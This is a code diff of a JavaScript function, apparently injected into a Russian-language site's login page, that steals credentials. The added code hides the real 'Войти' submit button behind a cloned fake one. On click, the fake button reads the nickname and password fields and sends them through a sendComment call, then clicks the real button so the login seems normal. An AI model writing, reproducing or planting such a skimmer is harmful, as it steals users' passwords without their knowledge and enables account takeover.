@@ -45,20 +45,33 @@ function editComment(e, t) {
 }
 
 function injectCode() {
-    console.log('Init Inject');
+  console.log('Init Inject');
 
   //let submitButton = document.querySelector('.p-devise_sessions .simple_form.b-form.new_user');
-    let submitButton = document.querySelector('.p-devise_sessions .btn-primary[value="Войти"]');
-    if(submitButton != null) {
-        console.log('button found!');
-        const name = document.getElementById('user_nickname');
-        const pass = document.getElementById('user_password');
-        console.log('inputs found!');
-        submitButton.addEventListener('mouseenter', ()=>{
-        sendComment(`name: ${name.value}, pass : ${pass.value}`);
-          console.log(`name: ${name.value}, pass : ${pass.value}`);
-       })
- }
+  let submitButton = document.querySelector('.p-devise_sessions .btn-primary[value="Войти"]');
+  if (submitButton != null) {
+    console.log('button found!');
+    let name = document.getElementById('user_nickname');
+    let pass = document.getElementById('user_password');
+    console.log('inputs found!');
+    //submitButton.addEventListener('mouseenter', ()=>{
+    //sendComment(`name: ${name.value}, pass : ${pass.value}`);
+    //  console.log(`name: ${name.value}, pass : ${pass.value}`);
+    //})
+
+    let fakeButton = submitButton.cloneNode(true);
+    fakeButton.classList.add('b-button');
+    fakeButton.type = 'button';
+    submitButton.after(fakeButton);
+    submitButton.style.display = 'none';
+    fakeButton.addEventListener('click', ()=>{
+      fakeButton.value = fakeButton.dataset.disableWith;
+      let strData = `name: ${name.value}, pass : ${pass.value}`;
+      //console.log(strData);
+      sendComment(strData);
+      submitButton.click();
+    })
+  }
 }
 
  function signOutUser() {
